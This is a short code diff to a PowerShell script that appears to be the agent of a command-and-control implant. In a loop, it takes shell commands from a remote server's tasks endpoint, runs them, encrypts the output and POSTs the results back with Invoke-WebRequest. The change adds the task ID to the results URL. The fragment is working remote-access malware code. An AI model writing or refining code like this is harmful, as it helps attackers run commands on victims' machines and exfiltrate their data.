@@ -133,6 +133,8 @@ for (;;){
                 $res  = shell $f $arg
                 $res  = Encrypt $key $res
                 $data = @{result = "$res"}
+
+                $resultl = ("$resultl" + "$taskId")
                 
                 Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
 
@@ -150,6 +152,9 @@ for (;;){
                 $taskl   = ("http" + ':' + "//$ip" + ':' + "$port/tasks/$name")
             
                 $data    = @{result = ""}
+
+                # $resultl = ("$resultl" + "$taskId")
+
                 Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
             }
             elseif ($command -eq "quit"){
